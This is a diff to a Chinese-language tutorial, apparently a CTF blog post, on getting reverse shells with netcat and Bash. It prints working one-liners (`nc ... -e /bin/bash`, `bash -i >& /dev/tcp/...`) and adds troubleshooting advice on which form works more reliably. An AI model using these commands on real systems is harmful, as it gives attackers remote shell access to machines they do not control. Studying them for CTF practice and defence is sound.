@@ -89,7 +89,7 @@ telnet协议是TCP/IP协议族的其中之一，是Internet远端登录服务的
 
 -lvp中l指监听，v指输出交互过程，p为指定端口
 
-靶机连接攻击机:`netcat Target_IP Target_Port -e /bin/bash`
+靶机连接攻击机:`nc Target_IP Target_Port -e /bin/bash`
 
 ![image-20220329104342323](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329104342323.png)
 
@@ -97,9 +97,11 @@ telnet协议是TCP/IP协议族的其中之一，是Internet远端登录服务的
 
 ### Bash
 
+Bash反弹shell的方法非常好用，题目的服务器环境可能没有nc,但是一定会有bash。
+
 同样的我们还是用nc -lvp Target_Port在攻击机的端口开启监听，`nc -lvp Target_Port`这次我们使用Bash结合重定向来反弹shell
 
-`bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1`或者`bash -c "bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1"`
+`bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1`或者`bash -c "bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1"`，推荐使用后者，使用前者弹shell,当命令在服务端shell中执行时可能存在/bin/sh的软连接并不指向bash的问题，导致报错`/bin/sh: 1:Syntax error:Bad fd number`。
 
 bash -i 产生bash交互环境 >& 将联合符号前后内容结合，重定向给后者，/dev/tcp/Target_IP/Target_Port让目标主机发起与攻击机在Target_Port上的TCP连接，0>&1将标准输入和标准输出的内容相结合，重定向给前面标准输出的内容。
 
